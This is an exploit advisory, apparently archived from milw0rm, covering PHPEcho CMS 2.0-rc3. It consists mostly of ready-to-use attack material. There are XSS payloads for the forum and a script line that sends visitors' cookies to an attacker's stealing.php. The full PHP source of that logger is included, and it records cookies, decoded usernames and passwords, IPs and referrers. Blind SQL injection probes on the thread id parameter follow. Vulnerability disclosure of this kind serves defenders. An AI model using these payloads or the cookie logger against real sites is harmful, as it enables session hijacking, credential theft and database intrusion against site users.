<html><head><title>PHPEcho CMS 2.0-rc3 (forum) XSS Cookie Stealing / Blind Vulnerability</title></head><pre>PHPEcho CMS 2.0-rc3 (forum) XSS Cookie Stealing / Blind Vulnerability
bug found by Jose Luis Gongora Fernandez (a.k.a) JosS

contact: sys-project[at]hotmail.com
website: http://www.hack0wn.com/

- download: http://sourceforge.net/project/showfiles.php?group_id=186100

~ [XSS]

  The forum allowed insert javascript code and html code.

  PoC:
  &quot;&gt;&lt;h1&gt;0wned&lt;/h1&gt;
  &quot;&gt;&lt;script&gt;alert(&quot;JosS b0x&quot;);&lt;/script&gt;
  
  -----------  

  Cookie Stealing:
  &lt;script&gt;window.location=http://127.0.0.1/stealing.php?cookie=+document.cookie&lt;/script&gt;

  stealing.php
  &lt;?php
  $archivo = fopen('log.htm','a');
  $cookie = $_GET['c'];
  $usuario = $_GET['id']; 
  $ip = getenv ('REMOTE_ADDR');
  $re = $HTTPREFERRER;

  $fecha=date(&quot;j F, Y, g:i a&quot;);
  fwrite($archivo, '&lt;hr&gt;USER and PASSWORD: '.base64_decode($usuario).'&lt;br&gt;Cookie: '.$cookie.'&lt;br&gt;Pagina: '.$re.'&lt;br&gt; 

  IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$fecha. '&lt;/hr&gt;');
  fclose($archivo);
  ?&gt;

~ [BLIND]

  PoC:
  /index.php?module=forum&amp;show=thread&amp;id=1 and 1=2 [False]
  /index.php?module=forum&amp;show=thread&amp;id=1 and 1=1 [True]

  /index.php?module=forum&amp;show=thread&amp;id=1 AND SUBSTRING(@@version,1,1)=5
  /index.php?module=forum&amp;show=thread&amp;id=1 AND SUBSTRING(@@version,1,1)=4



__h0__

# milw0rm.com [2009-06-24]</pre></html>